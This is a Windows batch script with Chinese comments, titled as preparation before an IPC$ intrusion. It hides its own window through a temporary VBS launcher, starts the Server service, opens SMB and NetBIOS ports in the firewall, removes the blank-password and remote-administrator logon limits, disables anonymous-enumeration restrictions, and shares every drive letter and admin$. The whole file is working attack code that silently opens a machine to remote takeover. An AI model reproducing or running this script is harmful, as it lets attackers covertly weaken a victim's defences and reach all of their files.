::-------------------------------------------------------------
::IPC$入侵前的准备工作      O(∩_∩)O哈哈~
::-------------------------------------------------------------

::功能:
::开启server服务
::添加防火墙例外
::去除远程登录管理员权限限制
::去除空密码限制

::-------------------------------------------------------------
::隐藏cmd窗口
@echo oFF 
if "%1" neq "1" (
>"%temp%\tmp.vbs" echo set WshShell = WScript.CreateObject^(^"WScript.Shell^"^) 
>>"%temp%\tmp.vbs" echo WshShell.Run chr^(34^) ^& %0 ^& chr^(34^) ^& ^" 1^",0 
start /d "%temp%" tmp.vbs 
exit 
) 

::-------------------------------------------------------------


::开启server服务
net start server /yes
net start lanmanserver /yes

::添加防火墙例外
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List" /v 137:udP /t reg_sz /d 137:UDP:LocalSubNet:Enabled:@xpsp2res.dll,-22001 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List" /v 138:udP /t reg_sz /d 138:UDP:LocalSubNet:Enabled:@xpsp2res.dll,-22002 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List" /v 139:TCP /t reg_sz /d 139:TCP:LocalSubNet:Enabled:@xpsp2res.dll,-22004 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List" /v 445:TCP /t reg_sz /d 445:TCP:LocalSubNet:Enabled:@xpsp2res.dll,-22005 /f

::去除远程登录管理员权限限制
::去除空密码限制
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v forceguest /t reg_dword /d 00000000 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v limitblankpassworduse /t reg_dword /d 00000000 /f

::开启默认共享
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\lanmanserver\parameters" /v AutoShareWks /t reg_dword /d 00000001 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\lanmanserver\parameters" /v AutoShareServer /t reg_dword /d 00000001 /f

::去除枚举限制
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v restrictanonymous /t reg_dword /d 00000000 /f

::设置共享
for %%a in (c d e f g h i j k l m n) do @(
if exist %%a: (
net share %%a$=%%a:
)
)
net share admin$

